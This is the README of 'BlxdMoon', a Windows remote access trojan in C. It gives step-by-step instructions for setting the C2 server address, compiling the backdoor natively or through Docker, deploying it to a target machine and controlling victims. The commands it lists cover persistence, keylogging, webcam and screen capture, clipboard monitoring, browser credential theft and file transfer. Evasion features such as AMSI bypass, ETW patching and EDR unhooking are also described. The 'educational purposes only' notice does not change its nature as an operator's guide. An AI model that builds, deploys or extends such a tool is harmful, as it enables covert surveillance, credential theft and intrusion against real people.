# BlxdMoon

> 🐀 **A RAT-System built in C, with persistence and multiple features.**

![Stars](https://img.shields.io/github/stars/FujiwaraChoki/BlxdMoon.svg)
![License](https://img.shields.io/github/license/FujiwaraChoki/BlxdMoon.svg)

[![BlxdMoon](repo/banner.png)](repo/banner.png)

> ⚠️ **Make sure to set the correct IP Addresses & Ports in server.c and backdoor.c.**

## Features

### Core Capabilities
- [x] Connection to a custom-set server
- [x] Receive commands from server, execute them and send back results
- [x] Advanced Multi-Layer Persistence (Registry, Startup Folder, Scheduled Tasks, WMI, Self-Healing Watchdog)
- [x] Start/Spawn other programs
- [x] Navigate through the file system
- [x] Keylogger functionality
- [x] Take screenshots
- [x] Download files from victim's computer
- [x] Upload files to victim's computer
- [x] Get Device Information
- [x] Wake on LAN (Multi-vendor enablement + magic packet sending)

### Defense Evasion
- [x] **Anti-Analysis** - VM detection, debugger detection, sandbox evasion
- [x] **AMSI Bypass** - Patches AmsiScanBuffer to evade script scanning
- [x] **ETW Patching** - Disables Event Tracing for Windows telemetry
- [x] **ntdll Unhooking** - Restores clean ntdll.dll to remove EDR hooks
- [x] **String Obfuscation** - XOR-encrypted strings decrypted at runtime
- [x] **API Hashing** - Dynamic API resolution via PEB walking (hides imports)
- [x] **Direct Syscalls** - Syscall number extraction for future hook bypass

See [Defense Evasion Documentation](docs/defender-evasion.md) for detailed explanations and MITRE ATT&CK mappings.

For external obfuscation tools, see [Obfuscation.md](Obfuscation.md).

## Compilation

### Prerequisites

- **Windows (Native)**: MinGW-w64 or MSVC, CMake 3.10+
- **macOS/Linux (Cross-compile)**: Docker

### Step 1: Configure IP & Port

Before building, configure the C2 server address:

```bash
./configure.sh <SERVER_IP> <SERVER_PORT>

# Example:
./configure.sh 192.168.1.100 4444
```

This updates the hardcoded IP/port in both `src/server.c` and `src/backdoor.c`.

---

### Option A: Native Build (Windows) - Recommended

Best option for full functionality including all evasion features.

```bash
# Create build directory
mkdir build && cd build

# Generate build files and compile
cmake ..
make

# Or with MSVC
cmake .. -G "Visual Studio 17 2022"
cmake --build . --config Release
```

**Output:**
- `build/server.exe` - C2 Server
- `build/backdoor.exe` - Client backdoor (with full evasion)

---

### Option B: Docker Cross-Build (macOS/Linux → Windows)

Build Windows executables from non-Windows hosts using MinGW in Docker.

```bash
# Build with custom IP/port
docker build -f Dockerfile.cross -t blxdmoon-cross \
  --build-arg SERVER_IP=192.168.1.100 \
  --build-arg SERVER_PORT=4444 .

# Extract the compiled binaries
docker create --name blxdmoon-out blxdmoon-cross
docker cp blxdmoon-out:/out ./dist
docker rm blxdmoon-out

# Binaries are now in ./dist/
ls -la dist/
```

**Output:**
- `dist/server.exe` - C2 Server
- `dist/backdoor.exe` - Client backdoor

> ⚠️ **Note:** Cross-compiled builds have **evasion features disabled** due to MinGW compatibility limitations with Windows internal structures. The backdoor will still function normally but without anti-analysis, AMSI bypass, ETW patching, and ntdll unhooking. For full evasion support, build natively on Windows.

---

### Option C: Manual Compilation (Advanced)

For manual compilation without CMake:

```bash
mkdir build

# Server (simple - no extra dependencies)
gcc -I include src/server.c src/status.c src/str_cut.c \
    -o build/server.exe -lws2_32

# Backdoor (full build with all modules)
gcc -I include \
    src/backdoor.c src/logger.c src/screen.c src/status.c src/str_cut.c \
    src/uuid.c src/wol.c src/process.c src/clipboard.c src/browser.c \
    src/webcam.c src/crypto.c src/persistence.c src/evasion.c \
    -o build/backdoor.exe \
    -lws2_32 -lgdi32 -lbcrypt -lcrypt32 -lstrmiids -lole32 -lshell32
```

To disable evasion (for MinGW compatibility):
```bash
gcc -I include -DDISABLE_EVASION \
    src/backdoor.c src/logger.c ... \
    -o build/backdoor.exe ...
```

## Usage

### 1. Start the C2 Server

```bash
# Windows
build\server.exe

# Or from dist/ if using Docker build
dist\server.exe
```

The server will start listening for incoming connections and display a command prompt.

### 2. Deploy the Backdoor

Transfer `backdoor.exe` to the target Windows machine and execute it. The backdoor will:
1. Hide its console window
2. Run evasion checks (if enabled)
3. Connect to the C2 server
4. Start the persistence watchdog
5. Enter the command loop

### 3. Interact with Clients

Once a client connects, use `list` to see connected clients and `select <id>` to interact:

```
BlxdMoon> list
[0] 192.168.1.50 - DESKTOP-ABC (admin)

BlxdMoon> select 0
[*] Now interacting with client 0

client[0]> info
client[0]> persist
client[0]> back
```

## Commands

| Command           | Description                                                                                      |
| ----------------- | ------------------------------------------------------------------------------------------------ |
| `cd {DIR_NAME}`   | Change directory                                                                                 |
| `persist`         | Install ALL persistence mechanisms (registry, startup, tasks, WMI)                               |
| `persist:registry`| Registry Run keys only (HKCU + HKLM if admin)                                                    |
| `persist:startup` | Copy to Startup folder with disguised name                                                       |
| `persist:task`    | Create scheduled tasks (logon trigger + 5-min watchdog)                                          |
| `persist:wmi`     | WMI event subscription (hard to detect)                                                          |
| `persist:check`   | Verify all persistence mechanisms, repair missing ones                                           |
| `keylogger:start` | Start the keylogger, writes to random {UUID}.txt in `Temp` Directory                             |
| `screen`          | Take a screenshot of the current screen, writes to random {UUID}.txt in `Temp/screens` Directory |
| `download {FILE}` | Download a file from the victim's computer                                                       |
| `upload {FILE}`   | Upload a file from server to victim's computer                                                   |
| `wol:{MAC}`       | Send Wake on LAN magic packet to wake machine with specified MAC address                         |
| `ps`              | List all running processes                                                                       |
| `kill:{PID}`      | Kill a process by PID                                                                            |
| `clipboard:start` | Start clipboard monitor                                                                          |
| `clipboard:dump`  | Get current clipboard contents                                                                   |
| `browser:creds`   | Extract all browser credentials                                                                  |
| `webcam`          | Capture webcam frame                                                                             |
| `info`            | Get system information (hostname, username, IP, CPU, GPU)                                        |
| `q`               | Quits the shell                                                                                  |

## License

[MIT](LICENSE)

```
MIT License

Copyright (c) 2023-2025 FujiwaraChoki

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## Notice

This project is for educational purposes only. I am not responsible for any
damage done by this software.

## Credits

BlxdMoon by [@FujiwaraChoki](https://github.com/FujiwaraChoki)
